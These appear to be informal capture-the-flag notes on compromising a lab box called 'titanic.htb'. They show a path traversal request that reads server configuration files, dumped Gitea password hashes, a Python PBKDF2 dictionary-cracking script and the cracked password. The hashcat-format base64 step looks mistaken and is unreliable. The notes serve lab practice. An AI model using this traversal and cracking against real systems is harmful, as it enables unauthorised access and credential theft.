___


# only 2 open ports
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63



endpoints: 

POST /book 

with booking info

GET /download?ticket=test.json

for booking confirmation

.htaccess is the file i need to read where is it though 

where is it

I did not enumerate SUBDOMAINS !!!!!!!!!!!!!!

dev subdomain found



gitea version
Version: 1.22.1

I can read files from the server:
gitea is running 
apache is running


![[Pasted image 20250227202608.png]]
users in gitea

version: '3.8'



is administrator account SQL creds 

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always


yml for gitea

version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always


# foken found it mate

GET /download?ticket=../../../../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1


# look at this database path

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable


downloaded that cause i have creds

# open file
 sqlite3 gitea.db

.tables
SELECT * FROM table_name;


# select values

sqlite> SELECT email,salt,passwd,passwd_hash_algo FROM user;
root@titanic.htb|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50
developer@titanic.htb|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50
hacker123@hacker.fr|3d36008a67cf0cba3fada101ca42d6b4|0163f6b9f400e2befc761f885b94d04d0ff9b21fa8d910db74b0e299a274d4d3b2617e80512efa10b0688531f5ee12444da0|pbkdf2$50000$50
test@outlook.com|948d6eb8f942df63b77b1db66f8f2c1f|35edf54b3a8f5b878440612d23f786cc196c7189cfd1ecf8c74d0f69eaf6879104368ab907ae1871d9fbfb58f4ad85f33d5c|pbkdf2$50000$50

┌[ew☮ew]-(~/box/titanic)
└> echo '2d149e5fbd1b20cf31db3e3c6a28fc9b' | base64 
MmQxNDllNWZiZDFiMjBjZjMxZGIzZTNjNmEyOGZjOWIK
┌[ew☮ew]-(~/box/titanic)
└> echo 'cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136' | base64
Y2JhMjBjY2Y5MjdkM2FkMDU2N2I2ODE2MTczMmQzZmJjYTA5OGNlODg2YmJjOTIzYjQwNjJhMzk2
MGQ0NTljMDhkMmRmYzA2M2IyNDA2YWM5MjA3Yzk4MGM0N2M1ZDAxNzEzNgo=


FORMAT HASHCAT wants:

sha256:50000:MmQxNDllNWZiZDFiMjBjZjMxZGIzZTNjNmEyOGZjOWIK:Y2JhMjBjY2Y5MjdkM2FkMDU2N2I2ODE2MTczMmQzZmJjYTA5OGNlODg2YmJjOTIzYjQwNjJhMzk2MGQ0NTljMDhkMmRmYzA2M2IyNDA2YWM5MjA3Yzk4MGM0N2M1ZDAxNzEzNgo=


# there r 2 docker containers running on the machine 
1) mysql
2) gitea




# this script cracked it:

# this is what chatGPT said
### **Why Does Your Python Script Seem Faster?**

1. **Python only checks passwords sequentially** from the dictionary.
2. **If the correct password is early in the file, it stops quickly**.
3. **Hashcat is trying to be efficient at scale**, checking passwords in bulk, which isn't efficient for PBKDF2.

import hashlib
import binascii
def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations,
        dklen
    )
    return hash_value
def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):
    target_hash_bytes = binascii.unhexlify(target_hash)
    with open(dictionary_file, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            hash_value = pbkdf2_hash(password, salt, iterations, dklen)
            if hash_value == target_hash_bytes:
                print(f"Found password: {password}")
                return password
    print("Password not found.")
    return None

# provide stuff
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
target_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dictionary_file = '/home/ew/Documents/wordlists/rockyou.txt'
find_matching_password(dictionary_file, target_hash, salt)


 
 
 
 Found password: 25282528


if you do strings on the binary then its jover you see that the script is copying the root flag to the temp dir so then just read that 



























